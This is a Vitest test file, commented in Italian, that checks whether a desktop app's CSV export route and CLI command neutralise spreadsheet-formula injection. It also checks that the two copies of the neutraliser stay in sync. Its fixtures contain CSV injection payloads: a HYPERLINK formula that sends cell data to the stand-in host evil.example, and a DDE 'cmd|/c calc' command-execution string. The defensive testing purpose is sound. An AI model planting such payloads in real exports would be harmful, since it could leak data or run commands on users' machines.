/**
 * #162 — le due copie dell'export CSV dentro `desktop/app-payload/`.
 *
 * #159 ha chiuso il buco nell'albero vivo mettendo il neutralizzatore in
 * `shared/export/csv.js`. Il payload desktop ha un `shared/` proprio, quindi
 * quel fix non lo raggiungeva: la route e il comando di quell'albero
 * portavano ancora il loro `toCsv`, con l'escaping RFC 4180 corretto e
 * nessuna neutralizzazione del primo carattere.
 *
 * Questa è la suite che gira su quell'albero — il payload non ne ha una
 * propria (`npm test` alla sua radice è ancora `no test specified`), mentre
 * `test.yml` installa le sue dipendenze proprio per importarne le route da
 * qui, come fa già `team-directives-desktop-boundary.test.ts`.
 *
 * L'ultimo test è quello che ferma il ripetersi del difetto: mette le due
 * copie del neutralizzatore una di fronte all'altra. Se una delle due viene
 * corretta e l'altra no, qui diventa rosso invece di restare una divergenza
 * che si scopre al prossimo audit.
 */
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { pathToFileURL } from "node:url";

const root = resolve(__dirname, "../../..");
const payload = join(root, "desktop/app-payload");
const payloadCsv = pathToFileURL(join(payload, "shared/export/csv.js")).href;
const payloadRoute = pathToFileURL(
  join(payload, "web/app/api/export/route.ts"),
).href;
const payloadCli = pathToFileURL(
  join(payload, "cli/src/commands/export.js"),
).href;

/** I sei modi di aprire una formula, con l'aria di un titolo vero. */
const POISONED_TITLES = {
  "=": '=HYPERLINK("https://evil.example/?d="&A1,"Senior Developer")',
  "+": "+Senior Developer",
  "-": "-1+cmd|'/c calc'!A0",
  "@": "@SUM(A1:A9)",
  "\t": '\t=HYPERLINK("https://evil.example","Backend Engineer")',
  "\r": "\r=1+1",
} as const;

/** La formula che non è in prima posizione: fuori dalle virgolette il CR
 * chiude la riga, quindi `=1+1` diventa la prima cella di una riga nuova. */
const SPLIT_TITLES = {
  "\r": "Backend Engineer\r=1+1",
  "\t": "Backend Engineer\t=2+2",
} as const;

const FORMULA_LEADERS = ["=", "+", "-", "@", "\t", "\r"];
const PLAIN_NUMBER = /^[+-]?\d+(?:\.\d+)?(?:[eE][+-]?\d+)?$/;

/** Il minimo RFC 4180 che serve per rileggere quello che abbiamo scritto: un
 * parser vero è esattamente ciò che sta fra il file e il motore di calcolo. */
function parseCsv(text: string): string[][] {
  const rows: string[][] = [[]];
  let field = "";
  let quoted = false;
  for (let i = 0; i < text.length; i += 1) {
    const char = text[i];
    if (quoted) {
      if (char !== '"') field += char;
      else if (text[i + 1] === '"') {
        field += '"';
        i += 1;
      } else quoted = false;
      continue;
    }
    if (char === '"') quoted = true;
    else if (char === ",") {
      rows[rows.length - 1].push(field);
      field = "";
    } else if (char === "\n" || char === "\r") {
      if (char === "\r" && text[i + 1] === "\n") i += 1;
      rows[rows.length - 1].push(field);
      field = "";
      rows.push([]);
    } else field += char;
  }
  rows[rows.length - 1].push(field);
  return rows;
}

/** La domanda vera: quella cella, aperta in Excel, viene valutata? */
function reachesFormulaEngine(cell: string): boolean {
  if (cell.length === 0) return false;
  if (!FORMULA_LEADERS.includes(cell[0])) return false;
  return !PLAIN_NUMBER.test(cell);
}

const ALL_TITLES = [
  ...Object.values(POISONED_TITLES),
  ...Object.values(SPLIT_TITLES),
];

describe("payload desktop — GET /api/export?format=csv", () => {
  let home: string;
  let previousHome: string | undefined;

  beforeEach(() => {
    // La route legge `~/.jht`: `homedir()` su POSIX è $HOME, e JHT_DIR viene
    // calcolato all'import, quindi la home finta va messa prima.
    previousHome = process.env.HOME;
    home = mkdtempSync(join(tmpdir(), "jht-payload-export-"));
    process.env.HOME = home;
    mkdirSync(join(home, ".jht"), { recursive: true });
    vi.resetModules();
  });

  afterEach(() => {
    vi.restoreAllMocks();
    vi.resetModules();
    rmSync(home, { recursive: true, force: true });
    if (previousHome === undefined) delete process.env.HOME;
    else process.env.HOME = previousHome;
  });

  it("un titolo scrapato che apre una formula esce inerte", async () => {
    const rows = ALL_TITLES.map((title, index) => ({
      title,
      company: "=1+1",
      createdAt: Date.now() - 1000 * (index + 1),
    }));
    writeFileSync(join(home, ".jht/jobs.json"), JSON.stringify(rows));
    const { GET } = await import(payloadRoute);

    const response = await GET({
      nextUrl: new URL("http://localhost/api/export?source=jobs&format=csv"),
    } as never);
    const csv = await response.text();

    const parsed = parseCsv(csv);
    // Intestazione più una riga per annuncio: nessun campo ha aperto righe
    // che nessuno ha esportato.
    expect(parsed).toHaveLength(rows.length + 1);
    expect(parsed.flat()).toContain(`'${POISONED_TITLES["="]}`);
    expect(parsed.flat().filter(reachesFormulaEngine)).toEqual([]);
  });
});

describe("payload desktop — jht export --csv", () => {
  let home: string;
  let previousHome: string | undefined;

  beforeEach(() => {
    previousHome = process.env.HOME;
    home = mkdtempSync(join(tmpdir(), "jht-payload-export-cli-"));
    process.env.HOME = home;
    process.exitCode = undefined;
    vi.resetModules();
  });

  afterEach(() => {
    vi.restoreAllMocks();
    vi.resetModules();
    rmSync(home, { recursive: true, force: true });
    if (previousHome === undefined) delete process.env.HOME;
    else process.env.HOME = previousHome;
    process.exitCode = undefined;
  });

  it("un valore che apre una formula esce inerte anche da qui", async () => {
    mkdirSync(join(home, ".jht/tasks"), { recursive: true });
    writeFileSync(
      join(home, ".jht/tasks/tasks.json"),
      JSON.stringify({
        tasks: ALL_TITLES.map((title) => ({ title, note: "Acme, Inc." })),
      }),
    );
    vi.spyOn(console, "log").mockImplementation(() => {});
    const output = join(home, "export.csv");
    const { handleExport } = await import(payloadCli);

    await handleExport("tasks", { csv: true, output });
    const csv = readFileSync(output, "utf-8");

    const parsed = parseCsv(csv);
    expect(parsed).toHaveLength(ALL_TITLES.length + 1);
    expect(parsed.flat()).toContain(`'${POISONED_TITLES["@"]}`);
    expect(parsed.flat().filter(reachesFormulaEngine)).toEqual([]);
    expect(process.exitCode).toBeUndefined();
  });
});

describe("le due copie del neutralizzatore rispondono uguale", () => {
  it("stesso CSV dall'albero vivo e dal payload, sugli stessi valori", async () => {
    // Il difetto di #162 non è stato scrivere una copia: è stato correggerne
    // una sola. Finché le due rispondono uguale la divergenza non è tornata,
    // e quando tornerà si vedrà qui e non in un audit fra un mese.
    const live = await import("../../../shared/export/csv.js");
    const forked = await import(payloadCsv);
    const rows = [
      ...ALL_TITLES.map((title) => ({ title, company: "Acme, Inc." })),
      { title: 'Senior "Full Stack" Developer, remote', company: "-5" },
      { title: "Junior\nDeveloper", company: "+3.14" },
      { "=cmd|'/c calc'!A0": "chiave dal JSON, non da noi" },
    ];

    expect(forked.toCsv(rows)).toBe(live.toCsv(rows));
    for (const value of [...ALL_TITLES, "-5", "+3.14", "1e9", "Acme S.p.A.", ""]) {
      expect(forked.neutralizeFormula(value)).toBe(
        live.neutralizeFormula(value),
      );
      expect(forked.csvCell(value)).toBe(live.csvCell(value));
    }
  });
});
